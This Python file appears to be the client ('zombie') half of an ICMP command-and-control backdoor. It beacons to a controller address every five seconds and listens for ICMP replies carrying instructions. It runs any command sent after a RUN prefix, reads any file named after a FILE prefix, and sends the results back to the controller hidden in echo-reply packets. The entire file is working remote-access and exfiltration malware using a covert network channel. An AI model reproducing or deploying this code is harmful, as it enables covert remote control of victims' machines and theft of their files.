
from icmp_c2_modules import *



cond = 0

def send_beacon(addr,data):
    while cond == 0:
        pkt_send(dest=SERVER_ADR,data=ZOMBIE,icmp_type=ICMP_REQUEST)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    print("packet recieved")
    if  Raw in packet:
        global cond
        cond = 1
        print("cond changed to " + str(cond))
        data_recieved = extract_data(packet)
        if data_recieved.startswith(RUN):
            output = RunCommand(data_recieved[4:])
            pkt_send(SERVER_ADR,output,"echo-reply")
        elif data_recieved.startswith(FILE):
            output = read_file(data_recieved[5:])
            pkt_send(SERVER_ADR,output,"echo-reply")
        cond = 0
        print("cond changed to " + str(cond))
            
# Start sniffing packets

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter=ICMP_RESPONSE + " and host " + SERVER_ADR,handler=parse_packet)
    
signal.signal(signal.SIGINT, signal_handler)
beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,ZOMBIE))
beacon_thread.start()

client_listen()